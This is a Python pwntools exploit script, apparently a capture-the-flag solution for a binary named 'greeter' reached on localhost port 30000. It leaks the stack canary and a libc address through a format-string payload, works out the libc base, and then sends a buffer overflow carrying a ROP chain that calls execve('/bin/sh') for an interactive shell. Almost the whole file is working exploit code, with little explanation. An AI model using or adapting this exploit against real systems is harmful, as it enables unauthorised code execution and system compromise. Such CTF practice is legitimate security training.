#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template greeter
from pwn import *
from struct import pack

# Set up pwntools for the correct architecture
exe = context.binary = ELF('greeter')
context.terminal = ['tmux', 'splitw', '-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

host = args.HOST or 'localhost'
port = int(args.PORT or 30000)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
entry
nextcall
nextcall
nextcall
# break at main
b *$rdi
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# %17$p - __libc_start_main+243
# %15$p - canary

fmt = b"%17$p.%15$p.\n" # leak __libc_start_main+243 i kanarka

io.recvuntil(b'Name?\n')
io.send(fmt)
leaked = io.recvuntil(b'welcome!\n').split(b'.')

print(leaked)
libc_start_main_243 = int(leaked[0][2:], 16)
canary = int(leaked[1][2:], 16)


print(f"libc_start_main+243 = {hex(libc_start_main_243)}")
print(f"canary = {hex(canary)}")


libc_start_main_offset = 0x27060
libc_base_addr = libc_start_main_243 - 243 - libc_start_main_offset
print(f"libc base addr = {hex(libc_base_addr)}")

input("enter to continue")

io.recvuntil(b'language?')


# ropper -f /usr/lib64/libc-2.29.so --chain "execve cmd=/bin/sh --badbytes=000a0d"

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = libc_base_addr
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x0000000000028cfd) # 0x0000000000028cfd: pop r13; ret; 
rop += b'//bin/sh'
rop += rebase_0(0x000000000003142f) # 0x000000000003142f: pop rbx; ret; 
rop += rebase_0(0x00000000001c0000)
rop += rebase_0(0x00000000000564d5) # 0x00000000000564d5: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000028cfd) # 0x0000000000028cfd: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x000000000003142f) # 0x000000000003142f: pop rbx; ret; 
rop += rebase_0(0x00000000001c0008)
rop += rebase_0(0x00000000000564d5) # 0x00000000000564d5: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000026b12) # 0x0000000000026b12: pop rdi; ret; 
rop += rebase_0(0x00000000001c0000)
rop += rebase_0(0x0000000000027037) # 0x0000000000027037: pop rsi; ret; 
rop += rebase_0(0x00000000001c0008)
rop += rebase_0(0x00000000000fa971) # 0x00000000000fa971: pop rdx; pop r12; ret; 
rop += rebase_0(0x00000000001c0008)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000003f080) # 0x000000000003f080: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x000000000003f289) # 0x000000000003f289: syscall; ret;

io.sendline(72*b'a' + p64(canary) + 8*b'b' +  rop) # sending ROP payload
io.interactive()
